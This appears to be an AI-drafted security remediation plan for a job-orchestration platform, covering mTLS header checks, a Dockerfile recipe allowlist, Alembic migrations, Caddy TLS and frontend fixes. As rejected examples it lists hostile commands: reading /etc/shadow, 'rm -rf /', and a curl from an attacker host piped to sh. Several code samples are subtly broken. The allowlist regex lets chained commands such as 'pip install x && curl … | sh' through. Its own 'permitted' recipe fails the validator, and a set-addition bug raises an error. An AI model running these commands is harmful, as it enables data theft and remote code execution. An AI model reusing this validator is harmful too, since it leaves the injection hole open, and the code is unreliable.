# Phase 164: Adversarial Audit Remediation — Research

**Researched:** 2026-04-17  
**Domain:** Security remediation (mTLS, RCE mitigation, database migrations, internal TLS, hardcoded keys, FE/BE alignment)  
**Confidence:** HIGH (all findings from adversarial audit reports verified in code)

## Summary

Phase 164 addresses six critical findings from the 2026-04-17 adversarial audit conducted against the Master of Puppets platform. The audit identified a NO-OP mTLS enforcement stub, arbitrary Dockerfile injection vulnerability in Foundry, absence of automated database migrations, insecure internal TLS proxy configuration, hardcoded public keys, and frontend-backend path/response-code misalignment. This phase remediates these findings without attempting major infrastructure changes (HSM, Kaniko migration, EE plugin architecture rewrite) — those are deferred to future phases.

**Primary recommendation:** Execute all six fixes sequentially: (1) mTLS header verification, (2) Foundry whitelist, (3) Alembic baseline + adoption, (4) Caddy internal TLS, (5) public key env vars, (6) FE/BE alignment (path audit + 402 handler + recipe validation).

---

## User Constraints (from CONTEXT.md)

### Locked Decisions
- Caddy enforces client certificate requirement on node-facing routes: `/work/pull`, `/heartbeat`
- Caddy forwards `X-SSL-Client-CN` header to the application after successful TLS handshake
- Revocation enforced at Caddy layer via CRL check at handshake time — rejected nodes never reach the application
- Application (`verify_client_cert`) reads `X-SSL-Client-CN`, looks up the node, and validates against the `RevokedCert` table as defense-in-depth
- `/api/enroll` stays unauthenticated at the TLS layer — cert bootstrap has no cert yet; JOIN_TOKEN is sole auth
- Caddy does NOT require client cert on `/api/enroll` route
- `verify_client_cert` must be wired up as a `Depends()` on `/work/pull` and `/heartbeat` routes
- Foundry whitelist: permitted instructions are `RUN pip install`, `RUN apt-get install`, `RUN apk add`, `RUN npm install`, `RUN yum install` (package managers only for RUN), `ENV`, `COPY`, `ARG`
- All other RUN variants (e.g. `RUN cat`, `RUN rm`, `RUN curl`) are rejected
- Validation happens at both API layer (blueprint create/update) and build time (defense-in-depth)
- Alembic: squash baseline representing full current schema, existing 48+ SQL files deleted after baseline, alembic runs automatically in FastAPI lifespan startup before `init_db()`, future schema changes go through `revision --autogenerate`
- Replace `tls_insecure_skip_verify` in Caddyfile with proper certificate verification for Caddy → agent internal traffic
- `_LICENCE_PUBLIC_KEY_BYTES` and `_MANIFEST_PUBLIC_KEY_PEM` move from hardcoded Python source to env vars: `LICENCE_PUBLIC_KEY` and `MANIFEST_PUBLIC_KEY`
- Dashboard intercepts HTTP 402 responses in `authenticatedFetch` and shows "Licence Expired" prompt
- Audit all frontend `fetch` / `authenticatedFetch` calls for routes missing the `/api/` prefix and align them

### Claude's Discretion
- Exact Caddy CRL configuration syntax (file-based vs URL-based CRL)
- Alembic baseline revision comment/documentation detail
- Exact wording of the 402 "Licence Expired" UI prompt
- Whether QUAL-01 (EE stub tagging), QUAL-03 (path normalization), QUAL-04 (broad exceptions) get opportunistic cleanup during this phase

### Deferred Ideas (OUT OF SCOPE)
- SEC-03: HSM / key rotation — Major infrastructure change, own phase
- ARCH-02: Replace subprocess docker build with Kaniko/buildah — Large Foundry rework, own phase
- ARCH-03: EE plugin architecture refactor — Move from `/tmp/ee_patches` to proper DI, own phase
- ARCH-04: Decompose monolithic main.py — Large refactor, own phase
- QUAL-01: EE stub tagging pattern cleanup
- QUAL-03: Manual path normalization drift risk
- QUAL-04: Broad catch-all exceptions

---

## Standard Stack

### mTLS Enforcement Pattern
| Component | Version/Tech | Purpose | Why Standard |
|-----------|-------------|---------|--------------|
| Caddy | 2.x (compose.server.yaml) | mTLS client cert requirement at ingress, CRL validation at handshake time | Load balancer + reverse proxy with native TLS client auth support |
| `X-SSL-Client-CN` header | HTTP (Caddy-to-agent) | Transport client common name from proxy to application layer | Standard proxy practice for cert metadata forwarding |
| `RevokedCert` table | SQLAlchemy ORM (db.py) | Track revoked certificate serials; serves as audit trail + defense-in-depth | Standard pattern alongside Caddy-layer CRL |

**Installation:**  
No new packages needed. Caddy already supports `client_auth` policy + CRL. FastAPI already handles request headers. SQLAlchemy already manages `RevokedCert`.

### Foundry Injection Whitelist
| Component | Approach | Purpose | Why Standard |
|-----------|----------|---------|--------------|
| Whitelist pattern | Explicit list of permitted Dockerfile instructions | Prevent arbitrary `RUN cat`, `RUN curl`, `RUN rm` injections | Allowlist is gold standard for injection prevention (vs. blocklist which has gaps) |
| Package manager detection | Regex patterns (`RUN (pip\|apt-get\|apk\|npm\|yum) install`) | Restrict `RUN` to package management only, not shell commands | Reduces surface area; legitimate recipes only use package managers |
| Validation layers | API layer (reject with error) + build time (reject before append) | Defense-in-depth: fail-fast at creation + safeguard at execution | Redundancy catches API bypasses |

**Example permitted recipe:**
```dockerfile
RUN pip install requests==2.28.1 boto3==1.26.0
RUN apt-get update && apt-get install -y curl
ENV AGENT_PORT=9090
COPY scripts/ /app/scripts/
ARG BASE_IMAGE=alpine:3.18
```

**Example rejected recipe:**
```dockerfile
RUN cat /etc/shadow          # ❌ not a package manager
RUN rm -rf /                # ❌ not a package manager
RUN curl https://malicious  # ❌ not a package manager
```

### Database Migrations (Alembic)
| Component | Version/Tech | Purpose | Why Standard |
|-----------|-------------|---------|--------------|
| Alembic | 1.13+ (pip install) | Version-controlled schema migrations with automatic upgrade path | Standard for SQLAlchemy projects; handles forward/backward compat |
| Baseline strategy | Squash all 48+ manual migrations into one initial revision | One-time setup; existing DB stamped with `alembic stamp head`, historical files deleted | Cleaner than replaying 48 incremental changes; matches current schema exactly |
| Lifespan integration | `alembic upgrade head` called in FastAPI lifespan startup before `init_db()` | Schema applied before table creation; ensures migrations + create_all are harmonized | Follows FastAPI async startup patterns |

**Installation:**
```bash
pip install alembic==1.13
alembic init puppeteer/agent_service/migrations  # Create alembic env
# Then: Create baseline revision squashing all 48 SQL files
# Then: Run `alembic upgrade head` in lifespan startup
```

### Internal TLS (Caddy → Agent)
| Component | Approach | Purpose | Why Standard |
|-----------|----------|---------|--------------|
| Caddy reverse_proxy certs | Mount internal CA cert from `certs-volume` into Caddy config | Trust agent's self-signed cert; replace `tls_insecure_skip_verify` | Proper TLS handshake verification prevents MITM on internal network |
| Caddy `tls_trusted_ca_certs` | Reference mounted PEM file path | Validate agent cert chain (agent.crt → internal CA) | Follows Caddy 2.x config pattern |

### Public Key Environment Variables
| Component | Current | Future | Why Needed |
|-----------|---------|--------|-----------|
| Manifest key | `_MANIFEST_PUBLIC_KEY_PEM` hardcoded in `ee.py` | `MANIFEST_PUBLIC_KEY` env var (PEM string) | Key rotation without redeployment |
| Licence key | `_LICENCE_PUBLIC_KEY_BYTES` hardcoded in `ee.py` | `LICENCE_PUBLIC_KEY` env var (PEM string) | Key rotation without redeployment |

**Pattern (existing precedent):**
```python
# Already done: ENCRYPTION_KEY, SECRET_KEY
ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY")
SECRET_KEY = os.getenv("SECRET_KEY")
# To apply to public keys:
MANIFEST_PUBLIC_KEY = os.getenv("MANIFEST_PUBLIC_KEY").encode()
LICENCE_PUBLIC_KEY = os.getenv("LICENCE_PUBLIC_KEY").encode()
```

### Frontend-Backend Alignment
| Issue | Current | Remediation | Why |
|-------|---------|-------------|-----|
| FEBE-02: Path prefix | Some calls to `/foundry/*`, `/template/*` (no `/api/`) | Audit all `fetch()` / `authenticatedFetch()` calls; align to `/api/` | Single API namespace is easier to secure and route |
| FEBE-01: 402 status | Generic error message | `authenticatedFetch()` intercepts 402, shows "Licence Expired" prompt | User-friendly; consistent with 401 login redirect |
| FEBE-03: Recipe validation | No client-side validation in `CreateBlueprintDialog.tsx` | Add inline validation regex + warning banner for disallowed instructions | Catch mistakes early; educate users on whitelist |

---

## Architecture Patterns

### SEC-01 Implementation: mTLS Verification via Header

**What:** Caddy validates client cert at TLS handshake, forwards cert CN via `X-SSL-Client-CN` header. Application reads header, looks up node, cross-checks `RevokedCert` table.

**When to use:** All node-facing endpoints (`/work/pull`, `/heartbeat`). NOT on `/api/enroll` (nodes don't have certs yet).

**Pattern:**
```python
# In security.py
async def verify_client_cert(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Enforces mTLS: verifies X-SSL-Client-CN header against RevokedCert table."""
    client_cn = request.headers.get("X-SSL-Client-CN")
    if not client_cn:
        raise HTTPException(status_code=403, detail="Missing client certificate")
    
    # Parse CN (expected format: "node-{node_id}")
    # Look up node in DB
    # Check if its serial is in RevokedCert
    # Raise 403 if revoked
    # Return node_id for downstream handlers
    
# In main.py — wire as dependency on /work/pull and /heartbeat:
@app.post("/work/pull")
async def pull_work(
    node_id = Depends(verify_client_cert),
    db: AsyncSession = Depends(get_db),
):
    # node_id is verified and not revoked
    ...
```

### SEC-02 Implementation: Foundry Whitelist Validation

**What:** Reject `injection_recipe` if it contains disallowed Dockerfile instructions.

**When to use:** On blueprint create/update (API layer) + before appending to Dockerfile (build time).

**Pattern:**
```python
# In models.py or validators
ALLOWED_RUN_PATTERNS = [
    r"RUN\s+(pip|apt-get|apk|npm|yum)\s+install\b",  # Package managers only
]
ALLOWED_INSTRUCTIONS = {"ENV", "COPY", "ARG"}  # Other allowed directives

def validate_injection_recipe(recipe: str) -> bool:
    """Returns False if recipe contains disallowed instructions."""
    lines = recipe.strip().split("\n")
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        
        # Check if it's a RUN instruction
        if line.upper().startswith("RUN "):
            # Only allow whitelisted package manager patterns
            if not any(re.match(pattern, line, re.IGNORECASE) for pattern in ALLOWED_RUN_PATTERNS):
                return False  # Reject non-package-manager RUN
        
        # Check if it's another allowed instruction
        elif not any(line.upper().startswith(instr) for instr in ALLOWED_INSTRUCTIONS):
            return False  # Reject unknown instruction
    
    return True

# In main.py — on blueprint create/update:
@app.post("/admin/blueprints")
async def create_blueprint(blueprint: BlueprintCreate, db: AsyncSession = Depends(get_db)):
    if not validate_injection_recipe(blueprint.injection_recipe):
        raise HTTPException(status_code=400, detail="Recipe contains disallowed instructions")
    ...

# In foundry_service.py — defense-in-depth at build time:
if recipe:
    if not validate_injection_recipe(recipe.injection_recipe):
        raise ValueError(f"Invalid recipe for tool {tool_id}")
    dockerfile.append(recipe.injection_recipe)
```

### ARCH-01 Implementation: Alembic Baseline + Adoption

**What:** Create one baseline Alembic revision representing the full current schema (equivalent to all 48 SQL files applied). Stamp existing production DB. Delete old SQL files. Integrate `alembic upgrade head` into FastAPI startup.

**Pattern:**
```bash
# 1. Initialize Alembic (creates puppeteer/agent_service/migrations/)
alembic init puppeteer/agent_service/migrations

# 2. Create baseline revision (squashes all 48 SQL files into one schema)
# Manually edit alembic/versions/001_baseline.py to include full schema
# OR use autogenerate if all tables are in SQLAlchemy ORM

# 3. Stamp existing production DB (tells Alembic "you're at head")
alembic stamp head

# 4. Delete 48 old migration_v*.sql files (git rm them)
rm puppeteer/migration_v*.sql

# 5. In main.py lifespan, call upgrade before init_db()
from alembic.config import Config
from alembic.script import ScriptDirectory
from alembic.runtime.migration import MigrationContext
from alembic.operations import Operations

@app.lifespan
async def lifespan(app: FastAPI):
    # Startup
    async with engine.begin() as conn:
        await conn.run_sync(run_alembic_upgrade)
    await init_db()
    yield
    # Shutdown
    await engine.dispose()

def run_alembic_upgrade(connection):
    """Run `alembic upgrade head`."""
    cfg = Config("alembic.ini")
    cfg.set_main_option("sqlalchemy.url", str(DATABASE_URL))
    cfg.attributes["connection"] = connection
    script = ScriptDirectory.from_config(cfg)
    migration_context = MigrationContext.configure(connection, opts={"target_metadata": Base.metadata})
    with Operations.context(migration_context):
        alembic.command.upgrade(cfg, "head")
```

### SEC-04 Implementation: Internal TLS in Caddyfile

**What:** Replace `tls_insecure_skip_verify` with proper cert verification using mounted CA.

**Pattern:**
```caddyfile
# Before (insecure):
reverse_proxy https://agent:8001 {
    transport http {
        tls_insecure_skip_verify
    }
}

# After (secure):
reverse_proxy https://agent:8001 {
    transport http {
        tls_trusted_ca_certs /etc/certs/internal-ca.crt  # Mounted from certs-volume
    }
}
```

**Where certs come from:**
- `certs-volume` is already mounted in compose.server.yaml
- Agent creates internal CA cert at startup (pki.py)
- Caddy needs read-only access to the same CA file

### QUAL-02 Implementation: Public Key Environment Variables

**What:** Move from hardcoded PEM to environment variables.

**Pattern:**
```python
# In agent_service/ee/plugin.py or wherever keys are used
import os

# Replace hardcoded blocks with:
MANIFEST_PUBLIC_KEY_PEM = os.getenv("MANIFEST_PUBLIC_KEY", "").encode()
LICENCE_PUBLIC_KEY_BYTES = os.getenv("LICENCE_PUBLIC_KEY", "").encode()

# With validation:
if not MANIFEST_PUBLIC_KEY_PEM:
    raise RuntimeError("MANIFEST_PUBLIC_KEY env var not set")
if not LICENCE_PUBLIC_KEY_BYTES:
    raise RuntimeError("LICENCE_PUBLIC_KEY env var not set")

# For compose.server.yaml:
environment:
  MANIFEST_PUBLIC_KEY: |
    -----BEGIN PUBLIC KEY-----
    ...base64...
    -----END PUBLIC KEY-----
  LICENCE_PUBLIC_KEY: |
    -----BEGIN PUBLIC KEY-----
    ...base64...
    -----END PUBLIC KEY-----
```

### FEBE-01 Implementation: 402 Licence Expired Handler

**What:** Intercept 402 in `authenticatedFetch()` and show user-friendly prompt.

**Pattern:**
```typescript
// In src/auth.ts — authenticatedFetch()
async function authenticatedFetch(
    url: string,
    options?: RequestInit
): Promise<Response> {
    const token = getToken();
    if (!token) {
        window.location.href = "/login";
        throw new Error("Not authenticated");
    }

    const response = await fetch(url, {
        ...options,
        headers: {
            "Authorization": `Bearer ${token}`,
            ...options?.headers,
        },
    });

    if (response.status === 401) {
        window.location.href = "/login";
        throw new Error("Session expired");
    }

    if (response.status === 402) {
        // NEW: Handle licence expiry
        showLicenceExpiredDialog();
        throw new Error("Licence expired");
    }

    if (!response.ok) {
        const body = await response.text();
        throw new Error(`HTTP ${response.status}: ${body}`);
    }

    return response;
}

// Modal component
function LicenceExpiredDialog() {
    return (
        <AlertDialog open={true}>
            <AlertDialogContent>
                <AlertDialogTitle>Licence Expired</AlertDialogTitle>
                <AlertDialogDescription>
                    Your enterprise licence has expired. 
                    Please contact support@example.com to renew.
                </AlertDialogDescription>
                <AlertDialogAction onClick={() => window.location.href = "/"}>
                    OK
                </AlertDialogAction>
            </AlertDialogContent>
        </AlertDialog>
    );
}
```

### FEBE-02 Implementation: API Path Audit

**What:** Audit all frontend `fetch()` calls and ensure they use `/api/` prefix.

**Pattern:**
```bash
# Scan all .ts/.tsx files for fetch() without /api/
grep -r "fetch(\s*['\"]\/\((?!api)\|['\"])\)" puppeteer/dashboard/src/ | grep -v "/api/"
# Manual review and align all to /api/ prefix
```

Example fixes:
```typescript
// Before:
const res = await fetch("/foundry/definitions");

// After:
const res = await fetch("/api/foundry/definitions");

// Backend should already have these routes registered as /api/*
```

### FEBE-03 Implementation: Recipe Validation in UI

**What:** Add inline validation in `CreateBlueprintDialog.tsx` to highlight disallowed instructions.

**Pattern:**
```typescript
// In CreateBlueprintDialog.tsx
function CreateBlueprintDialog() {
    const [recipe, setRecipe] = useState("");
    const [recipeErrors, setRecipeErrors] = useState<string[]>([]);

    const validateRecipe = (value: string) => {
        const errors: string[] = [];
        const lines = value.split("\n");
        const allowedRunPattern = /^RUN\s+(pip|apt-get|apk|npm|yum)\s+install\b/i;
        const allowedInstructions = /^(ENV|COPY|ARG|RUN)\b/i;

        lines.forEach((line, idx) => {
            line = line.trim();
            if (!line || line.startsWith("#")) return;

            if (line.toUpperCase().startsWith("RUN ")) {
                if (!allowedRunPattern.test(line)) {
                    errors.push(`Line ${idx + 1}: RUN instruction must use package managers (pip, apt-get, apk, npm, yum)`);
                }
            } else if (!allowedInstructions.test(line)) {
                errors.push(`Line ${idx + 1}: Disallowed instruction. Use ENV, COPY, ARG, or whitelisted RUN.`);
            }
        });

        setRecipeErrors(errors);
        setRecipe(value);
    };

    return (
        <Dialog>
            <DialogContent>
                <Textarea
                    value={recipe}
                    onChange={(e) => validateRecipe(e.target.value)}
                    placeholder="RUN pip install ..."
                />
                {recipeErrors.length > 0 && (
                    <Alert variant="destructive">
                        <AlertTitle>Recipe Validation Issues</AlertTitle>
                        <AlertDescription>
                            {recipeErrors.map((err) => (
                                <div key={err}>{err}</div>
                            ))}
                        </AlertDescription>
                    </Alert>
                )}
                <Button 
                    onClick={handleSave}
                    disabled={recipeErrors.length > 0}
                >
                    Create Blueprint
                </Button>
            </DialogContent>
        </Dialog>
    );
}
```

---

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Database migration management | Custom migration runner / shell scripts | Alembic | Alembic handles version tracking, conflicts, rollback, and is the SQLAlchemy standard |
| mTLS certificate validation | Custom cert parsing / X.509 verification | Caddy client_auth + app-layer header verification | Caddy handles TLS handshake + CRL; app just reads trusted header. Avoids crypto library complexity. |
| Dockerfile injection prevention | Try-catch on subprocess output | Allowlist validation at API + build time | Allowlist is auditable and maintainable; catching errors after the fact is reactive. |
| HTTP status interception | Global error handler trying to parse all 4xx/5xx | Wrapper around `authenticatedFetch()` | Centralizes auth-related intercepts (401, 402); clear separation of concerns. |
| Recipe validation | Custom regex in multiple places | Centralized `validate_injection_recipe()` function | DRY: single source of truth for whitelist rules. |

---

## Common Pitfalls

### Pitfall 1: Alembic Baseline Migration is Too Large
**What goes wrong:** Including all 48+ SQL files in a single baseline revision makes the revision file unwieldy and slow to review.

**Why it happens:** No squashing tool; manually copying all migration_v*.sql into one revision.

**How to avoid:** Use Alembic's autogenerate feature on a clean schema copy, then manually review and edit the baseline revision. Or, keep baseline as a shell that calls `Base.metadata.create_all` in the upgrade step.

**Warning signs:** Baseline revision file > 5000 lines; slow `alembic upgrade head` on fresh install.

### Pitfall 2: mTLS Header Spoofing
**What goes wrong:** Caddy is configured to require client certs at the TLS layer, but the application doesn't actually verify the header — an attacker could forge `X-SSL-Client-CN` directly to Caddy's internal port.

**Why it happens:** Assuming Caddy's TLS handshake is sufficient; forgetting that defense-in-depth requires application-layer verification.

**How to avoid:** Always implement `verify_client_cert` in the application. Cross-check the `X-SSL-Client-CN` header against the `Node` table and `RevokedCert` table. Assume the header is untrusted until verified.

**Warning signs:** `verify_client_cert` function is empty or only logs; no database lookup in the handler.

### Pitfall 3: Foundry Whitelist is Too Permissive
**What goes wrong:** Regex for allowed RUN patterns accidentally matches `RUN cat`, `RUN curl`, etc.

**Why it happens:** Miswritten regex (e.g., `RUN.*install` matches `RUN bash -c "echo install"`).

**How to avoid:** Use strict regex that matches the exact package manager command: `RUN\s+(pip|apt-get|apk|npm|yum)\s+install\b`. Test regex against both allowed and disallowed inputs before deployment.

**Warning signs:** A recipe with `RUN curl https://attacker.com | sh` is accepted; tests don't cover edge cases.

### Pitfall 4: Caddy Internal TLS Config Missing PEM File
**What goes wrong:** Caddyfile references `/etc/certs/internal-ca.crt` but the file is not mounted in compose.server.yaml, or is mounted read-only but Caddy can't read it.

**Why it happens:** Forgetting to update the compose file when changing Caddyfile; cert permissions are wrong (not readable by Caddy process).

**How to avoid:** Mount `certs-volume` into Caddy's `/etc/certs` directory with `ro: true`. Verify the CA PEM file exists in the volume before Caddy starts. Use a health check to validate cert loading.

**Warning signs:** Caddy container logs "permission denied" or "no such file"; TLS handshake fails between Caddy and agent.

### Pitfall 5: Hardcoded Public Keys Not Removed from Source
**What goes wrong:** New env var is added, but old hardcoded key is still in the source code. Developers use the hardcoded fallback instead of the env var, defeating the purpose.

**Why it happens:** Incomplete refactoring; no linting rule to detect hardcoded keys.

**How to avoid:** Use `git grep` to find all instances of the key before/after refactoring. Ensure old constants are deleted (not just shadowed by new env var logic). Add a comment: `# DEPRECATED: use env var MANIFEST_PUBLIC_KEY instead`.

**Warning signs:** Old `_MANIFEST_PUBLIC_KEY_PEM` constant still exists in source; `git blame` shows it was "refactored" but not removed.

### Pitfall 6: API Path Alignment Incomplete
**What goes wrong:** Some routes audited and prefixed with `/api/`, but old `/foundry/*` routes are still called in other components. Dashboard 404s or uses fallback behavior.

**Why it happens:** Frontend code is in many files; missing a file or component during the audit sweep.

**How to avoid:** Audit in two passes: (1) global `grep` to find all `fetch()` calls, (2) manual review + test of each route in the browser (Network tab). Add a lint rule to warn on `fetch()` without `/api/`.

**Warning signs:** Some API calls in the dashboard Network tab show 404 on old routes; functionality works inconsistently based on which component is used.

### Pitfall 7: 402 Licence Expired Dialog Shown But Route Still Errors
**What goes wrong:** Dashboard shows "Licence Expired" modal, but the underlying API call fails silently or retries indefinitely.

**Why it happens:** `authenticatedFetch()` throws an error after showing the modal; callers don't handle the error gracefully.

**How to avoid:** Have `authenticatedFetch()` show the modal AND re-throw the error so callers can clean up (abort pending requests, unmount components). Or, return a special result object instead of throwing.

**Warning signs:** Modal is shown but the page is still loading spinners in the background; Network tab shows repeated failed API calls.

---

## Code Examples

### mTLS Enforcement: Full Implementation
```python
# In puppeteer/agent_service/security.py
async def verify_client_cert(
    request: Request,
    db: AsyncSession = Depends(get_db)
) -> str:
    """
    Verifies mTLS: reads X-SSL-Client-CN from Caddy, 
    looks up node, cross-checks RevokedCert table.
    Returns node_id if valid; raises 403 if missing, revoked, or not found.
    """
    client_cn = request.headers.get("X-SSL-Client-CN")
    if not client_cn:
        raise HTTPException(
            status_code=403, 
            detail="Missing client certificate (X-SSL-Client-CN header)"
        )
    
    # Parse node ID from CN (expected format: "node-{node_id}")
    if not client_cn.startswith("node-"):
        raise HTTPException(status_code=403, detail="Invalid certificate CN format")
    
    node_id = client_cn[5:]  # Strip "node-" prefix
    
    # Look up node
    node = await db.execute(
        select(Node).where(Node.id == node_id)
    )
    node_obj = node.scalar_one_or_none()
    if not node_obj:
        raise HTTPException(status_code=403, detail="Node not found")
    
    # Check if revoked
    if node_obj.client_cert_pem:
        # Extract serial from PEM and check against RevokedCert
        from cryptography import x509
        from cryptography.hazmat.backends import default_backend
        
        cert = x509.load_pem_x509_certificate(
            node_obj.client_cert_pem.encode(),
            default_backend()
        )
        serial = cert.serial_number
        
        revoked = await db.execute(
            select(RevokedCert).where(RevokedCert.serial == serial)
        )
        if revoked.scalar_one_or_none():
            raise HTTPException(status_code=403, detail="Certificate revoked")
    
    return node_id

# In puppeteer/agent_service/main.py
@app.post("/work/pull")
async def pull_work(
    node_id: str = Depends(verify_client_cert),
    db: AsyncSession = Depends(get_db),
):
    """Pulls next job for the node (mTLS-protected)."""
    # node_id is verified and not revoked
    work_response = await job_service.poll_next_job(node_id, db)
    return work_response

@app.post("/heartbeat")
async def heartbeat(
    node_id: str = Depends(verify_client_cert),
    db: AsyncSession = Depends(get_db),
):
    """Reports node health (mTLS-protected)."""
    # node_id is verified and not revoked
    ...
```

### Foundry Whitelist: Full Implementation
```python
# In puppeteer/agent_service/models.py (or validators.py)
import re
from typing import Optional

def validate_injection_recipe(recipe: str) -> tuple[bool, Optional[str]]:
    """
    Validates an injection_recipe against the whitelist.
    Returns (is_valid, error_message).
    """
    ALLOWED_RUN_PATTERNS = [
        r"RUN\s+(pip|apt-get|apk|npm|yum)\s+install\b",
    ]
    ALLOWED_INSTRUCTIONS = {"ENV", "COPY", "ARG"}
    
    lines = recipe.strip().split("\n")
    
    for line_num, line in enumerate(lines, start=1):
        line = line.strip()
        
        # Skip empty lines and comments
        if not line or line.startswith("#"):
            continue
        
        # Check RUN instructions
        if line.upper().startswith("RUN "):
            matches_pattern = any(
                re.match(pattern, line, re.IGNORECASE) 
                for pattern in ALLOWED_RUN_PATTERNS
            )
            if not matches_pattern:
                return False, (
                    f"Line {line_num}: RUN instruction must use a whitelisted package manager "
                    "(pip, apt-get, apk, npm, yum). Arbitrary RUN commands are not allowed."
                )
        
        # Check other instructions
        elif not any(line.upper().startswith(instr + " ") or line.upper() == instr 
                     for instr in ALLOWED_INSTRUCTIONS + {"RUN"}):
            return False, (
                f"Line {line_num}: Disallowed instruction. "
                "Allowed: RUN (package managers only), ENV, COPY, ARG."
            )
    
    return True, None

# In puppeteer/agent_service/main.py
from puppeteer.agent_service.models import BlueprintCreate, validate_injection_recipe

@app.post("/admin/blueprints", dependencies=[Depends(require_permission("foundry:write"))])
async def create_blueprint(
    blueprint: BlueprintCreate,
    db: AsyncSession = Depends(get_db),
):
    """Creates a new blueprint with injection recipe validation."""
    is_valid, error = validate_injection_recipe(blueprint.injection_recipe)
    if not is_valid:
        raise HTTPException(status_code=400, detail=error)
    
    # Proceed with blueprint creation
    db_blueprint = PuppetTemplate(
        name=blueprint.name,
        injection_recipe=blueprint.injection_recipe,
        ...
    )
    db.add(db_blueprint)
    await db.commit()
    return db_blueprint

# In puppeteer/agent_service/services/foundry_service.py (defense-in-depth at build time)
async def build_template(...):
    ...
    for tool_id in capabilities:
        recipe = ...  # fetch from DB
        if recipe:
            is_valid, error = validate_injection_recipe(recipe.injection_recipe)
            if not is_valid:
                raise ValueError(f"Invalid recipe for tool {tool_id}: {error}")
            
            dockerfile.append(f"# Recipe for {tool_id}")
            dockerfile.append(recipe.injection_recipe)
    ...
```

---

## State of the Art

| Issue | Old Approach | Current (Phase 164) | When Changed | Impact |
|-------|-------------|---------------------|--------------|--------|
| Database migrations | Manual SQL files (48+) | Alembic with baseline | 2026-04-17 | Single source of truth; automated upgrade path |
| mTLS enforcement | NO-OP stub (`pass`) | Header verification + DB cross-check | 2026-04-17 | Nodes must prove identity; prevents spoofing |
| Foundry injection | Free-text `injection_recipe` | Whitelist validation (API + build time) | 2026-04-17 | Only package managers allowed; prevents RCE |
| Internal TLS | `tls_insecure_skip_verify` | Proper cert verification with mounted CA | 2026-04-17 | Internal network protected from MITM |
| Public keys | Hardcoded in source (`_MANIFEST_PUBLIC_KEY_PEM`) | Environment variables (`MANIFEST_PUBLIC_KEY` env var) | 2026-04-17 | Key rotation without redeployment |
| 402 handling | Generic error message | Dedicated "Licence Expired" modal | 2026-04-17 | User-friendly feedback; consistent with 401 pattern |
| API paths | Mixed `/api/` and `/foundry/` prefixes | Unified `/api/*` namespace | 2026-04-17 | Single, auditable API surface |

**Deprecated/outdated:**
- **Manual migration_v*.sql files** (48+): Superseded by Alembic. To be deleted after baseline is created and stamped.
- **`tls_insecure_skip_verify` blocks in Caddyfile** (6 instances): Replaced with `tls_trusted_ca_certs` + mounted CA PEM.
- **Hardcoded public key constants**: Replaced with env var lookups in security.py.

---

## Open Questions

1. **Alembic baseline revision strategy**
   - What we know: All 48 SQL files must be represented in a single baseline. `alembic stamp head` will mark the DB as at-head.
   - What's unclear: Should the baseline revision reference the SQL files (via `op.execute(open(...).read())`), or should we manually reconstruct the schema in `upgrade()`? How do we validate baseline matches actual schema?
   - Recommendation: Use `alembic revision --autogenerate` on a fresh schema to auto-detect all tables, then manually review. This is less error-prone than copying SQL files.

2. **Caddy CRL sync**
   - What we know: Caddy needs to validate client certs against a CRL at handshake time. `puppeteer/cert-manager/Caddyfile` will be updated to reference the CRL.
   - What's unclear: Should CRL be file-based (`crl = /path/to/crl.pem`) or URL-based (`crl_url = https://...`)? How does the CRL get updated in Caddy when new certs are revoked?
   - Recommendation: Use file-based CRL (generated by pki.py whenever a cert is revoked) and mount it into Caddy. Simpler than HTTP polling and avoids external dependencies.

3. **Recipe validation regex edge cases**
   - What we know: Whitelist allows `RUN pip install`, `RUN apt-get install`, etc. 
   - What's unclear: What about multiline RUN statements (e.g., `RUN pip install \ package1 \ package2`)? Should they be allowed?
   - Recommendation: Require single-line RUN statements for simplicity. If users need multiline, they can use shell tricks like `&&`. Multiline RUN opens the door to whitespace-based bypass tricks.

4. **402 modal scope**
   - What we know: Dashboard intercepts HTTP 402 and shows "Licence Expired".
   - What's unclear: Should the modal allow retry? Should it redirect to a help link? Should it log the incident?
   - Recommendation: Show modal, optionally provide a "Contact Support" link, auto-close on 200 response if the license is renewed server-side. No retry loop (user must fix offline).

---

## Validation Architecture

### Test Framework
| Property | Value |
|----------|-------|
| Framework | pytest (backend) + vitest (frontend) |
| Config file | `puppeteer/pytest.ini` + `puppeteer/dashboard/vitest.config.ts` |
| Quick run command | `cd puppeteer && pytest tests/test_security.py -x` (mTLS tests) |
| Full suite command | `cd puppeteer && pytest` + `cd puppeteer/dashboard && npm run test` |

### Phase Requirements → Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| SEC-01 | `verify_client_cert` accepts valid `X-SSL-Client-CN` header | unit | `pytest tests/test_security.py::test_verify_client_cert_valid -xvs` | ❌ Wave 0 |
| SEC-01 | `verify_client_cert` rejects missing header | unit | `pytest tests/test_security.py::test_verify_client_cert_missing_header -xvs` | ❌ Wave 0 |
| SEC-01 | `verify_client_cert` rejects revoked cert (checks RevokedCert table) | unit | `pytest tests/test_security.py::test_verify_client_cert_revoked -xvs` | ❌ Wave 0 |
| SEC-01 | `/work/pull` requires mTLS (Depends on verify_client_cert) | integration | `pytest tests/test_job_service.py::test_pull_work_requires_mtls -xvs` | ❌ Wave 0 |
| SEC-01 | `/heartbeat` requires mTLS | integration | `pytest tests/test_job_service.py::test_heartbeat_requires_mtls -xvs` | ❌ Wave 0 |
| SEC-01 | `/api/enroll` does NOT require mTLS (only JOIN_TOKEN) | integration | `pytest tests/test_pki_service.py::test_enroll_no_client_cert -xvs` | ❌ Wave 0 |
| SEC-02 | `validate_injection_recipe` rejects `RUN cat` | unit | `pytest tests/test_foundry.py::test_recipe_rejects_run_cat -xvs` | ❌ Wave 0 |
| SEC-02 | `validate_injection_recipe` rejects `RUN curl` | unit | `pytest tests/test_foundry.py::test_recipe_rejects_run_curl -xvs` | ❌ Wave 0 |
| SEC-02 | `validate_injection_recipe` accepts `RUN pip install` | unit | `pytest tests/test_foundry.py::test_recipe_accepts_pip -xvs` | ❌ Wave 0 |
| SEC-02 | Blueprint creation rejects invalid recipe (API layer) | integration | `pytest tests/test_foundry.py::test_create_blueprint_invalid_recipe -xvs` | ❌ Wave 0 |
